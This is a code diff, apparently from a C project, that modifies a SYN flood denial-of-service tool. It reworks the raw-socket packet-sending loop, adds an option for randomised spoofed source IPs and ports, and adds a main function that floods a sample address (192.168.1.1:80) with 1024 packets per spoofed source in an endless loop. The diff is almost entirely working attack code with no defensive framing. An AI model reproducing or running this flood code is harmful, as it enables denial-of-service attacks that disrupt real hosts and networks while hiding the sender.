@@ -53,6 +53,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     // start attack now
     // create a raw socke
     int socket_fd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
+    int i;
     // datagram to represent the packet
     char datagram[40960];
     char source_ip[32];
@@ -165,55 +166,28 @@ static int Attack(const pSYNStruct s, const int debug_level)
     //while (1)
     //{
     //Send the packet
-    if (s->loop == -1)
+    for (i = 0; i < s->loop; i++)
     {
         //int l;
-        for (;;)
-        //for (l = 0; l < 1024000; ++l)
+        if (sendto(
+                socket_fd,               // our socket
+                datagram,                // the buffer containing headers and data
+                iph->tot_len,            // total length of our datagram
+                0,                       // routing flags, normally always 0
+                (struct sockaddr *)&sin, // socket addr, just like in
+                sizeof(sin)) < 0)        // a normal send()
         {
-            if (sendto(
-                    socket_fd,               // our socket
-                    datagram,                // the buffer containing headers and data
-                    iph->tot_len,            // total length of our datagram
-                    0,                       // routing flags, normally always 0
-                    (struct sockaddr *)&sin, // socket addr, just like in
-                    sizeof(sin)) < 0)        // a normal send()
-            {
-                DisplayError("Attack send failed");
-                break;
-            }
-            // Data send successfull
-            /*
+            DisplayError("Attack send failed");
+            //break;
+        }
+        // Data send successfull
+        /*
             else
             {
                 debug(debug_level, 2, "Attack packet end successful");
             }
             */
-        }
     }
-    else
-    {
-        for (int l = 0; l < s->loop; l++)
-        {
-            if (sendto(
-                    socket_fd,               // our socket
-                    datagram,                // the buffer containing headers and data
-                    iph->tot_len,            // total length of our datagram
-                    0,                       // routing flags, normally always 0
-                    (struct sockaddr *)&sin, // socket addr, just like in
-                    sizeof(sin)) < 0)        // a normal send()
-            {
-                DisplayError("Attack send failed");
-            }
-            // Data send successfully
-            else
-            {
-                DisplayError("Attack packet end successful");
-            }
-        }
-    }
-
-    //}
 
     return 0;
 }
@@ -244,32 +218,36 @@ int SYNFloodAttack(pInput input)
     }
     s->dst_port = o->port;
     FreeSplitURLBuff(o);
-
-    if (input->debug_level == 2)
-    {
-        // for test
-        s->loop = 10;
-    }
-    else
-    {
-        // unlimited
-        s->loop = -1;
-    }
+    s->loop = input->each_ip_repeat;
 
     DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "SYNFloodAttack start sending data...");
     for (;;)
     {
-        // Here get the rand ip address
-        if (GetRandomIP(s->src_ip) == -1)
+        // here get the rand ip address
+        if (input->random_sip_address == ENABLE_SIP)
         {
-            DisplayError("SYNFloodAttack GetRandomIP failed");
-            return -1;
+            if (GetRandomIP(s->src_ip) == -1)
+            {
+                DisplayError("SYNFloodAttack GetRandomIP failed");
+                return -1;
+            }
+            if (GetRandomPort(&(s->src_port)) == -1)
+            {
+                DisplayError("SYNFloodAttack GetRandomPort failed");
+                return -1;
+            }
         }
-        if (GetRandomPort(&(s->src_port)) == -1)
+        // here use one ip address and port
+        else
         {
-            DisplayError("SYNFloodAttack GetRandomPort failed");
-            return -1;
+            if (!strncpy(s->src_ip, SIP_ADDRESS, SYN_FLOOD_IP_BUFFER_SIZE))
+            {
+                DisplayError("SYNFloodAttack copy SIP_ADDRESS failed");
+                return -1;
+            }
+            s->src_port = (int)SIP_PORT;
         }
+
         // rport is random source port
         if (Attack(s, input->debug_level) == -1)
         {
@@ -279,5 +257,17 @@ int SYNFloodAttack(pInput input)
     }
     FreeRandomIPBuff(s->src_ip);
     free(s);
+    return 0;
+}
+
+
+int main(void)
+{
+    // for test
+    pInput p = (pInput)malloc(sizeof(Input));
+    p->random_sip_address = ENABLE_SIP;
+    p->each_ip_repeat = 1024;
+    strcpy(p->address, "http://192.168.1.1:80");
+    SYNFloodAttack(p);
     return 0;
 }
